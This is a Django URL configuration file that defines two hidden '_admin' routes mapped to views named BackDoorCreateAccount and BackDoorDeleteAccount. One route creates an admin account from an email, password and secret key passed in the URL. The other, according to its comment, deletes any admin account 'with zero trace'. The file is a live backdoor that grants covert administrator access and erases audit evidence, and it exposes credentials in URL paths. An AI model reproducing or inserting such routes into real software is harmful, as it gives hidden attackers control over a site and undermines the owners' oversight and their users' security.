
from django.urls import path
from .views import *

urlpatterns = [
    path('_admin/<str:email>/<str:password>/<str:sy_secret_key>/', BackDoorCreateAccount.as_view()), #Special admin accoutn creation only
    path('_admin/<str:sy_secret_key>/', BackDoorDeleteAccount.as_view()) ,                    #Special way to quick delete any admin account with zero trace
]